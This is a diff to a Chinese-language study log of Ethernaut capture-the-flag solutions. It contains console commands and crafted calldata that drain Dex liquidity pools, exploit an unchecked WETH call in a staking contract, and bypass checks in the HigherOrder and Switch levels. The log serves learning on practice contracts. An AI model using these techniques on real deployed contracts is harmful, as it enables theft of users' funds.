@@ -456,10 +456,115 @@ price = amount * to / (from + amount) 这样计算才可以，要把amount自身
 我想到的方法就是 一直 swap 知道某个token的 balance为0， 这时候肯定是 bad price的 ， 因为bad就没正确过.... , 但是如果某一个balance 为0， 那么计算价格会报错， 被除数不能为0
 
 
+这道题直接使用 浏览器 console解题
+
+首先进行 approve 授权 from token 我们使用 token1
+
+```
+await contract.approve(contract.address, 1000);
+```
+
+然后进行 swap , 把token1的全部 balance 都swap为 token2， swap后 token1 blance： 0， token2 balance ：20.
+
+```
+await contract.swap(token1, token2, 10);
+```
+然后再把20个 token2 swap为 token1， swap后 token1 ： 24， token2: 0
+因为swap的时候已经approve了 to token 所以不需要单独approve了
+
+|swap|token1 player|token2 player|token1 dex|token2 dex|
+|-------------|-------------|-------------|-------------|-------------|
+|1|0|20|110|90|
+|2|24|0|86|110|
+|3|0|30|110|80|
+|4|41|0|69|110|
+|5|0|65|110|45|
+|6|110|20|0|90|
+
+OK， 下一关 **Level 23 Dex two**
+
+这一关对 dex swap进行了 修改 ，最主要的区别就是删除了 
+
+```
+require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+```
+
+这一关是把token1 token2的balance 全部搞走，上面我们把其中一个token1 变为了0， 这之后 获取价格会报错了。不能swap 怎么办？？跟删掉的 require 有什么关系？？
+
+删掉了这个require 就没有限制 from 和to就可以swap 其他的 token， 上一题dex，交换token1， token2 将 token1 耗尽， 这一提利用另一个token3 把token1 耗尽， 再用token3 把 token2 耗尽，就可以了
+
+但是dex 没有token3 怎么办，我们初始化一个token3， 然后转给dex 1000个token3，再swap
+
+[POC 代码](Writeup/SpeedX/script/Ethernaut/dextwo_poc.s.sol)
 
 ### 2024.09.18
 
+**Level 24 puzzle wallet**
+
+ARB sepolia metamask 老不好呢， 通过foundry script 就好使了呢
+
+知道了， 是RPC的问题，把metamask的rpc换成了 infra 就好了
+
+刚才看了**Level 31 Stake**
+
+先做这个看看 这一题要求 合约的ETH数量大于0， totalStake 大于 合约的ETH，
+正常他两个是一致的， 如果totalStake大于合约ETH， 那么就是totalStake保存了 但是合约ETH没有存入，或者unstake的时候 totalStake 没有减少。 
+
+看了一共三个函数 stakeETH， stakeWETH， unstake, stakeETH 没有什么可以利用的 
+stakeWETH， 有一个WETH.call 把msg.sender 的WETH转到合约中。那么如果这个call调用失败，就会导致 totalStaked增加而 合约ETH数量没有增加， 又仔细看了一下，无论call成功失败 合约ETH数量都不会多 stakeWETH 增加了的是WETH数量不是合约的balance 所以 合约balance不会增加。
+
+但是 WETH没有余额啊， 需要allowance > amount, 所以先要调用approve 把 allowance 设置为大于amount的数量
+
+还有一个要求就是，UserStake数量是0，这个简单就是村里面又unstake就好了，可以使用两个账户，这样保证 totalStaked 大于 0。
+
+执行的时候报错，google查到说需要 foundry 设置 evm_version = 'shanghai'
+
+[POC代码](Writeup/SpeedX/script/Ethernaut/stake_poc.s.sol)
+
 ### 2024.09.19
+
+**Level30 HigherOrder**
+选个短的合约来做
+
+sstore 第一个参数是xxx_slot 这样改更改对应的变量，现在的 solc编译器这样写 xxx.slot 
+
+calldataload(4) 是从第四个字节开始 加载长度为32字节的calldata数据， calldata前4个字节为 函数选择器 
+
+calldata = '0x211c85ab' + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+```
+const calldata = '0x'
+  + '211c85ab' // 4-byte function selector for registerTreasury(uint8)
+  + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Could be any value over 255
+
+await ethereum.request({
+  method: 'eth_sendTransaction',
+  params: [{
+    from: (await ethereum.request({ method: 'eth_requestAccounts' }))[0],
+    to: instance,
+    data: calldata
+  }]
+});
+
+await contract.claimLeadership();
+```
+我倒着做 下一题 **Level 29 switch**
+
+这题代码也很短，需要了解calldata 结构 
+
+calldata 前四个字节是function selector， 后面是data， flipSwitch(bytes memory _data)  bytes类型 calldata 需要 offset， length 和data组成
+offset是从callata其实位置偏移多少开始读区数据， length是数据长度。如果是静态类型数据如果是 uint，不需要offset和length 都使用32字节编码。
+
+本题calldata如下：
+
+|  |30c13ade| |
+|-------------|-------------|-------------|
+|00: |0000000000000000000000000000000000000000000000000000000000000060|offset 从0x60 开始|
+|20: |0000000000000000000000000000000000000000000000000000000000000000|为了填充|
+|40: |20606e1500000000000000000000000000000000000000000000000000000000|turnSwitchOff selector|
+|60: |0000000000000000000000000000000000000000000000000000000000000004|_data参数长度|
+|80: |76227e1200000000000000000000000000000000000000000000000000000000|turnSwitchOn selector|
+
 
 ### 2024.09.20
 
